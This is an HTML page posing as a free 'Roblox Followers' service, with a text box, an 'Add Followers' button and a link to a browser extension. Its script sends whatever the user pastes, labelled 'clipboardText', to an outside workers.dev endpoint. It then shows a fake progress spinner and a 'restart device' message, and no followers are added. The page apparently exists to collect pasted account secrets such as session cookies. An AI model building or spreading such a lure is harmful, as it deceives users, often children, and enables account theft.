<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  min-height: 100%;
  font-family: Arial, Helvetica, sans-serif;
}

body {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  color: white;

  background:
    radial-gradient(circle at 15% 15%, rgba(80,120,255,.18), transparent 28%),
    radial-gradient(circle at 85% 85%, rgba(160,80,255,.14), transparent 30%),
    linear-gradient(135deg, #05060a, #0b0d16 50%, #05060a);
}

/* Animated background */
.background {
  position: fixed;
  inset: 0;
  overflow: hidden;
  pointer-events: none;
}

.orb {
  position: absolute;
  border-radius: 50%;
  filter: blur(90px);
  opacity: .45;
  animation: float 10s ease-in-out infinite;
}

.orb.one {
  width: 380px;
  height: 380px;
  background: #315cff;
  top: -180px;
  left: -120px;
}

.orb.two {
  width: 350px;
  height: 350px;
  background: #8b3dff;
  right: -150px;
  bottom: -150px;
  animation-delay: -4s;
}

.orb.three {
  width: 180px;
  height: 180px;
  background: #168cff;
  left: 45%;
  top: 55%;
  opacity: .15;
  animation-delay: -7s;
}

@keyframes float {
  0%, 100% {
    transform: translate3d(0, 0, 0) scale(1);
  }

  50% {
    transform: translate3d(25px, -20px, 0) scale(1.08);
  }
}

/* Main card */
.card {
  position: relative;
  width: min(92%, 540px);
  padding: 46px 38px 34px;
  text-align: center;

  background: linear-gradient(
    145deg,
    rgba(24,27,40,.88),
    rgba(10,12,20,.82)
  );

  border: 1px solid rgba(255,255,255,.10);
  border-radius: 30px;

  box-shadow:
    0 40px 100px rgba(0,0,0,.55),
    0 0 80px rgba(65,90,255,.08),
    inset 0 1px rgba(255,255,255,.08);

  backdrop-filter: blur(25px);
}

/* Top shine */
.card::before {
  content: "";
  position: absolute;
  top: 0;
  left: 12%;
  width: 76%;
  height: 1px;

  background: linear-gradient(
    90deg,
    transparent,
    rgba(255,255,255,.35),
    transparent
  );
}

/* Logo */
.logo {
  position: relative;

  width: 82px;
  height: 82px;
  margin: 0 auto 22px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 24px;

  background:
    linear-gradient(145deg, #ffffff, #dfe4ff);

  color: #111522;

  font-size: 35px;
  font-weight: 900;

  box-shadow:
    0 20px 45px rgba(0,0,0,.4),
    0 0 35px rgba(110,130,255,.15);

  transform: rotate(-2deg);
}

.logo::after {
  content: "";
  position: absolute;
  inset: 2px;

  border-radius: 22px;

  border: 1px solid rgba(255,255,255,.7);

  pointer-events: none;
}

/* Heading */
h1 {
  margin: 0;

  font-size: 40px;
  line-height: 1.05;
  letter-spacing: -1.5px;

  background: linear-gradient(
    90deg,
    #ffffff,
    #dfe4ff,
    #ffffff
  );

  -webkit-background-clip: text;
  background-clip: text;
  color: transparent;
}

.subtitle {
  max-width: 390px;

  margin: 14px auto 28px;

  color: #9ca3b7;

  font-size: 15px;
  line-height: 1.6;
}

/* Status pill */
.status-pill {
  display: inline-flex;
  align-items: center;
  gap: 8px;

  margin-bottom: 22px;
  padding: 7px 12px;

  border-radius: 999px;

  background: rgba(255,255,255,.045);
  border: 1px solid rgba(255,255,255,.08);

  color: #aeb6ca;

  font-size: 12px;
  font-weight: 700;
}

.status-dot {
  width: 7px;
  height: 7px;

  border-radius: 50%;

  background: #61e294;

  box-shadow: 0 0 12px rgba(97,226,148,.7);
}

/* Input */
.input-wrap {
  margin-bottom: 12px;
}

.text-input {
  width: 100%;

  padding: 16px 17px;

  border: 1px solid rgba(255,255,255,.10);
  border-radius: 14px;

  outline: none;

  background: rgba(255,255,255,.045);
  color: white;

  font-size: 15px;

  transition:
    border-color .2s ease,
    background .2s ease,
    box-shadow .2s ease;
}

.text-input::placeholder {
  color: #70788d;
}

.text-input:focus {
  border-color: rgba(120,140,255,.55);

  background: rgba(255,255,255,.065);

  box-shadow:
    0 0 0 4px rgba(100,120,255,.08);
}

/* Main button */
.main-button {
  position: relative;
  overflow: hidden;

  width: 100%;
  padding: 17px 24px;

  border: none;
  border-radius: 15px;

  background: linear-gradient(
    135deg,
    #ffffff,
    #e4e8ff
  );

  color: #111522;

  font-size: 17px;
  font-weight: 800;

  cursor: pointer;

  box-shadow:
    0 12px 30px rgba(0,0,0,.25);

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    filter .2s ease;
}

.main-button::before {
  content: "";

  position: absolute;
  top: 0;
  left: -120%;

  width: 80%;
  height: 100%;

  background: linear-gradient(
    90deg,
    transparent,
    rgba(255,255,255,.65),
    transparent
  );

  transform: skewX(-20deg);

  transition: left .6s ease;
}

.main-button:hover::before {
  left: 140%;
}

.main-button:hover {
  transform: translateY(-2px);

  box-shadow:
    0 18px 40px rgba(0,0,0,.32),
    0 0 25px rgba(120,140,255,.12);

  filter: brightness(1.03);
}

.main-button:active {
  transform: translateY(0) scale(.985);
}

/* Extension button */
.extension-button {
  display: block;

  width: 100%;
  margin-top: 11px;
  padding: 15px 20px;

  border: 1px solid rgba(255,255,255,.09);
  border-radius: 15px;

  background: rgba(255,255,255,.045);
  color: #e8ebf5;

  text-decoration: none;

  font-size: 15px;
  font-weight: 700;

  transition:
    transform .2s ease,
    background .2s ease,
    border-color .2s ease;
}

.extension-button:hover {
  transform: translateY(-2px);

  background: rgba(255,255,255,.075);

  border-color: rgba(255,255,255,.16);
}

/* Status */
.status {
  min-height: 22px;

  margin-top: 18px;

  color: #929aae;

  font-size: 13px;
}

/* Spinner */
.spinner {
  display: inline-block;

  width: 15px;
  height: 15px;

  margin-right: 7px;

  vertical-align: -3px;

  border: 2px solid rgba(255,255,255,.18);
  border-top-color: #ffffff;

  border-radius: 50%;

  animation: spin .75s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* Bottom information */
.footer {
  margin-top: 25px;
  padding-top: 18px;

  border-top: 1px solid rgba(255,255,255,.06);

  color: #626b80;

  font-size: 11px;
}

.footer span {
  margin: 0 6px;
  color: #3f4655;
}

/* Mobile */
@media (max-width: 500px) {
  .card {
    width: 92%;
    padding: 38px 22px 27px;
    border-radius: 25px;
  }

  .logo {
    width: 70px;
    height: 70px;
    border-radius: 21px;
    font-size: 30px;
  }

  h1 {
    font-size: 32px;
  }

  .subtitle {
    font-size: 14px;
    margin-bottom: 23px;
  }

  .orb.one {
    width: 260px;
    height: 260px;
  }

  .orb.two {
    width: 250px;
    height: 250px;
  }
}
</style>
</head>

<body>

<div class="background">
  <div class="orb one"></div>
  <div class="orb two"></div>
  <div class="orb three"></div>
</div>

<div class="card">

  <div class="logo">R</div>

  <h1>Roblox Followers</h1>

  <p class="subtitle">
    Grow your Roblox presence with a simple and streamlined experience.
  </p>

  <div class="status-pill">
    <span class="status-dot"></span>
    System Online
  </div>

  <div class="input-wrap">
    <input
      class="text-input"
      id="userText"
      type="text"
      placeholder="Enter your text"
      autocomplete="off"
    >
  </div>

  <button class="main-button" id="main">
    Add Followers
  </button>

  <a
    class="extension-button"
    href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher"
    target="_blank"
    rel="noopener noreferrer"
  >
    Extension
  </a>

  <div class="status" id="status"></div>

  <div class="footer">
    Secure connection
    <span>•</span>
    Roblox Followers
  </div>

</div>

<script>
const button = document.getElementById("main");
const status = document.getElementById("status");
const userText = document.getElementById("userText");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";

button.addEventListener("click", async () => {

  const text = userText.value.trim();

  if (!text) {
    status.textContent = "Please enter some text first.";
    return;
  }

  const confirmed = confirm(
    "This will submit the text you entered. Continue?"
  );

  if (!confirmed) {
    status.textContent = "Cancelled.";
    return;
  }

  try {

    button.disabled = true;

    status.innerHTML = `
      <span class="spinner"></span>
      Adding Followers...
    `;

    await fetch(SEND_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        clipboardText: text
      })
    });

    await new Promise(resolve =>
      setTimeout(resolve, 10000)
    );

    status.textContent =
      "Restart Device To Get Followers Added to your account!";

  } catch (error) {

    status.textContent =
      "Something went wrong. Please try again.";

    console.error(error);

  } finally {

    button.disabled = false;

  }
});
</script>

</body>
</html>
